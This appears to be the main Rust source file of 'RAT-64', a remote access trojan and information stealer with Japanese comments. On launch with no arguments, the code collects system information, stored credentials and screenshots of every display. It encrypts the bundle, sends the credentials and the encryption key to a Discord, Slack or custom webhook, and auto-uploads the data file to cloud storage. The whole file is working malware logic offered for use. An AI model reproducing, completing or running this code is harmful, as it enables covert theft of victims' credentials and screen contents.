// RAT-64 - 統合システム情報収集ツール
use rmp_serde::encode::to_vec as to_msgpack_vec;
use rand::RngCore;

use rat_64::{collect_auth_data_with_config, encrypt_data_with_key, is_admin};

#[cfg(feature = "screenshot")]
use rat_64::modules::screen_capture::{capture_screenshot, capture_all_displays, ScreenshotConfig};

// スクリーンショット収集統合版
fn collect_screenshots() -> rat_64::ScreenshotData {
    let capture_time = format!("{:?}", std::time::SystemTime::now());
    
    #[cfg(feature = "screenshot")]
    {
        let config = ScreenshotConfig::default();
        let primary_display = capture_screenshot(&config)
            .map(Some)
            .unwrap_or(None);
        
        let all_displays = capture_all_displays(&config)
            .unwrap_or_else(|_| Vec::new());
        
        let primary_count = if primary_display.is_some() { 1 } else { 0 };
        rat_64::ScreenshotData {
            primary_display,
            total_count: all_displays.len() + primary_count,
            all_displays,
            capture_time,
        }
    }
    
    #[cfg(not(feature = "screenshot"))]
    {
        rat_64::ScreenshotData {
            primary_display: None,
            all_displays: Vec::new(),
            capture_time,
            total_count: 0,
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // 権限チェック（サイレント）
    let _admin_mode = is_admin();
    
    // 引数なしでデフォルト実行（全機能有効）
    execute_full_rat_system()
}

fn execute_full_rat_system() -> Result<(), Box<dyn std::error::Error>> {
    let config = rat_64::load_config_or_default();
    
    // システム情報収集（常に実行）
    let system_info = rat_64::get_system_info()
        .map_err(|e| format!("システム情報収集エラー: {}", e))?;
    
    // 認証情報収集（常に実行）
    let auth_data = collect_auth_data_with_config(&config);

    // Webhook送信（データ収集後すぐに送信）
    #[cfg(feature = "network")]
    send_webhook_notification(&config, &system_info, &auth_data);

    // スクリーンショット収集（常に実行）
    let screenshot_data = collect_screenshots();

    // データ統合とシリアライゼーション
    #[derive(serde::Serialize)]
    struct FullData {
        system_info: rat_64::SystemInfo,
        auth_data: rat_64::AuthData,
        screenshot_data: rat_64::ScreenshotData,
    }
    
    let full_data = FullData { system_info, auth_data, screenshot_data };
    let data = to_msgpack_vec(&full_data)?;
    
    // 暗号化キー生成と暗号化
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 12];
    rand::rng().fill_bytes(&mut key);
    rand::rng().fill_bytes(&mut nonce);

    let encrypted_data = encrypt_data_with_key(&data, &key, &nonce)?;
    
    // 暗号化データ保存のみ
    save_data_only(&encrypted_data)?;
    
    // 暗号化キーをWebhookで送信
    #[cfg(feature = "network")]
    send_encryption_key_webhook(&config, &key, &nonce);
    
    // ローカルにもキーファイルを保存（復号化用）
    save_key_file(&key, &nonce)?;
    
    // ネットワーク機能（常に実行）
    #[cfg(feature = "network")]
    {
        println!("🌐 Auto-uploading collected data...");
        match rat_64::upload_data_file() {
            Ok(msg) => {
                println!("{}", msg);
                println!("📤 Data successfully uploaded to cloud storage!");
            },
            Err(e) => eprintln!("❌ Upload error: {}", e),
        }
    }
    
    Ok(())
}

// 統合ファイル保存関数
fn save_data_only(encrypted_data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // 暗号化データ保存のみ
    std::fs::write("data.dat", encrypted_data)?;
    Ok(())
}

// キーファイル保存関数
fn save_key_file(key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
    use base64::{engine::general_purpose::STANDARD, Engine};
    
    let key_b64 = STANDARD.encode(key);
    let nonce_b64 = STANDARD.encode(nonce);
    
    // key.txt形式で保存（復号化ツール用）
    let key_content = format!("{}\n{}\n", key_b64, nonce_b64);
    std::fs::write("key.txt", key_content)?;
    
    // key.json形式でも保存（バックアップ用）
    let key_json = serde_json::json!({
        "key": key_b64,
        "nonce": nonce_b64,
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs()
    });
    std::fs::write("key.json", serde_json::to_string_pretty(&key_json)?)?;
    
    println!("🔑 Encryption keys saved to key.txt and key.json");
    
    Ok(())
}

// Webhook送信関数
#[cfg(feature = "network")]
fn send_webhook_notification(config: &rat_64::Config, system_info: &rat_64::SystemInfo, auth_data: &rat_64::AuthData) {
    use rat_64::modules::notification_sender::{WebhookConfig, WebhookType, send_webhook};
    
    // WebhookConfig作成
    let webhook_config = WebhookConfig {
        webhook_url: if config.webhook_url.is_empty() {
            None
        } else {
            Some(config.webhook_url.clone())
        },
        webhook_type: match config.webhook_type.as_str() {
            "Discord" => WebhookType::Discord,
            "Slack" => WebhookType::Slack,
            "Custom" => WebhookType::Custom,
            _ => WebhookType::None,
        },
        retry_attempts: config.retry_attempts,
        timeout_seconds: config.timeout_seconds,
    };
    
    // Webhook送信
    if webhook_config.webhook_url.is_some() {
        println!("📡 Sending webhook notification...");
        match send_webhook(&webhook_config, system_info, auth_data) {
            Ok(_) => println!("✅ Webhook sent successfully!"),
            Err(e) => eprintln!("❌ Webhook error: {}", e),
        }
    } else {
        println!("⚠️ Webhook URL not configured");
    }
}

// 暗号化キーWebhook送信関数
#[cfg(feature = "network")]
fn send_encryption_key_webhook(config: &rat_64::Config, key: &[u8; 32], nonce: &[u8; 12]) {
    use rat_64::modules::notification_sender::{WebhookConfig, WebhookType, send_encryption_key_webhook};
    
    // WebhookConfig作成
    let webhook_config = WebhookConfig {
        webhook_url: if config.webhook_url.is_empty() {
            None
        } else {
            Some(config.webhook_url.clone())
        },
        webhook_type: match config.webhook_type.as_str() {
            "Discord" => WebhookType::Discord,
            "Slack" => WebhookType::Slack,
            "Custom" => WebhookType::Custom,
            _ => WebhookType::None,
        },
        retry_attempts: config.retry_attempts,
        timeout_seconds: config.timeout_seconds,
    };
    
    // 暗号化キーを送信
    if webhook_config.webhook_url.is_some() {
        println!("🔑 Sending encryption keys...");
        match send_encryption_key_webhook(&webhook_config, key, nonce) {
            Ok(_) => println!("✅ Encryption keys sent successfully!"),
            Err(e) => eprintln!("❌ Key sending error: {}", e),
        }
    }
}
